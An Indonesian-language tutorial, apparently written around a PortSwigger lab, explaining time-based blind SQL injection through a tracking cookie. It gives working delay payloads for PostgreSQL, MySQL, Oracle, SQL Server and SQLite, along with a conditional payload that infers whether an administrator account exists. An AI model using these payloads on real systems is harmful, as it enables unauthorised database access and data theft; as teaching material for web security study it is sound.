# Blind SQL injection with time delays
## **Apa itu Blind SQL Injection dengan Time Delays?**
Blind SQL Injection dengan time delays adalah teknik injeksi SQL yang digunakan untuk memperoleh informasi dari database tanpa mengandalkan respons langsung. Dengan memanfaatkan fungsi waktu, kita dapat menginduksi delay (penundaan) berdasarkan kondisi tertentu untuk menginfokan hasil query.

---

## **Penjelasan Query PostgreSQL**
Pada PostgreSQL, kita dapat menggunakan fungsi `pg_sleep(seconds)` untuk membuat penundaan eksekusi query.

### **Payload:**
```sql
COOKIE'||pg_sleep(10)--
```

#### **Penjelasan:**
1. **`COOKIE`**: Nilai cookie yang sedang diuji.
2. **`||`**: Operator penggabungan string di PostgreSQL.
3. **`pg_sleep(10)`**: Menunda eksekusi selama 10 detik.
4. **`--`**: Komentar untuk mengabaikan sisa query.

### **Contoh Implementasi:**
```plaintext
Cookie: TrackingId=TGjY2hbNNRAamLIb'||pg_sleep(10)--
```
Jika cookie valid dan injeksi berhasil, server akan menunda respon selama 10 detik, menandakan bahwa payload diterima.

---

## **Adaptasi ke Database Lain**
### **1. MySQL**
MySQL menggunakan fungsi `SLEEP(seconds)` untuk membuat penundaan.

#### **Payload:**
```sql
COOKIE' OR SLEEP(10)--
```

#### **Penjelasan:**
1. **`COOKIE`**: Nilai cookie.
2. **`OR`**: Membuat kondisi selalu benar.
3. **`SLEEP(10)`**: Menunda eksekusi selama 10 detik.
4. **`--`**: Mengabaikan sisa query.

#### **Contoh Implementasi:**
```plaintext
Cookie: TrackingId=TGjY2hbNNRAamLIb' OR SLEEP(10)--
```

---

### **2. Oracle**
Oracle menggunakan fungsi `DBMS_LOCK.SLEEP(seconds)` untuk membuat penundaan.

#### **Payload:**
```sql
COOKIE' || DBMS_LOCK.SLEEP(10)--
```

#### **Penjelasan:**
1. **`DBMS_LOCK.SLEEP(10)`**: Menunda eksekusi selama 10 detik.

#### **Contoh Implementasi:**
```plaintext
Cookie: TrackingId=TGjY2hbNNRAamLIb' || DBMS_LOCK.SLEEP(10)--
```

---

### **3. Microsoft SQL Server**
Microsoft SQL Server menggunakan fungsi `WAITFOR DELAY` untuk membuat penundaan.

#### **Payload:**
```sql
COOKIE'; WAITFOR DELAY '00:00:10'--
```

#### **Penjelasan:**
1. **`WAITFOR DELAY '00:00:10'`**: Menunda eksekusi selama 10 detik.

#### **Contoh Implementasi:**
```plaintext
Cookie: TrackingId=TGjY2hbNNRAamLIb'; WAITFOR DELAY '00:00:10'--
```

---

### **4. SQLite**
SQLite tidak memiliki fungsi bawaan untuk penundaan waktu, tetapi kita dapat menggunakan query besar yang memakan waktu untuk dijalankan, seperti iterasi panjang.

#### **Payload (Simulasi Delay):**
```sql
COOKIE' OR (SELECT COUNT(*) FROM large_table, large_table2)--
```

#### **Penjelasan:**
1. **`COUNT(*)`**: Menghitung semua entri pada dua tabel besar untuk memperlambat respons.

---

## **Langkah Eksploitasi**
1. **Identifikasi Kerentanan**: Uji respons server menggunakan payload sederhana.
2. **Uji Penundaan**: Gunakan payload berbasis waktu sesuai dengan database yang digunakan.
3. **Inferensi Data**:
   - Gabungkan kondisi logis untuk memeriksa keberadaan data.
   - Contoh:
     ```sql
     COOKIE'||CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END--
     ```

---

## **Referensi**
- [Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
